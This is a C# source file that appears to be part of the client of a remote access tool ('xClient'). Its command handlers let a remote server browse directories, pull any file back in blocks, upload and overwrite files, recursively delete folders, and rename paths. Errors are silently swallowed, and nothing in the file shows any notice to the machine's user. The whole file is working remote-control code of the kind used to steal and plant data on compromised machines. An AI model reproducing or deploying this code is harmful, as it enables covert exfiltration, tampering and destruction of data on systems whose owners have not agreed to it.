using System;
using System.IO;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
    public static partial class CommandHandler
    {
        public static void HandleGetDirectory(Packets.ServerPackets.GetDirectory command, Client client)
        {
            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] { DELIMITER };
                    filessize = new long[] { 0 };
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] { DELIMITER };

                new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch
            {
                new Packets.ClientPackets.GetDirectoryResponse(new string[] { DELIMITER }, new string[] { DELIMITER },
                    new long[] { 0 }).Execute(client);
            }
        }

        public static void HandleDoDownloadFile(Packets.ServerPackets.DoDownloadFile command, Client client)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                    {
                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                            srcFile.LastError).Execute(client);
                        _limitThreads.Release();
                        return;
                    }

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
                            break;

                        byte[] block;
                        if (srcFile.ReadBlock(currentBlock, out block))
                        {
                            new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                                Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                                srcFile.LastError).Execute(client);
                        }
                        else
                        {
                            new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                                srcFile.LastError).Execute(client);
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
                _limitThreads.Release();
            }).Start();
        }

        public static void HandleDoDownloadFileCancel(Packets.ServerPackets.DoDownloadFileCancel command, Client client)
        {
            if (!_canceledDownloads.ContainsKey(command.ID))
            {
                _canceledDownloads.Add(command.ID, "canceled");
                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
            }
        }

        public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
        {
            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
                NativeMethods.DeleteFile(command.RemotePath); // delete existing file

            FileSplit destFile = new FileSplit(command.RemotePath);
            destFile.AppendBlock(command.Block, command.CurrentBlock);
        }

        public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
        {
            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Delete(command.Path, true);
                        break;
                    case PathType.File:
                        File.Delete(command.Path);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path)), client);
            }
            catch
            {
            }
        }

        public static void HandleDoPathRename(Packets.ServerPackets.DoPathRename command, Client client)
        {
            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Move(command.Path, command.NewPath);
                        break;
                    case PathType.File:
                        File.Move(command.Path, command.NewPath);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch
            {
            }
        }
    }
}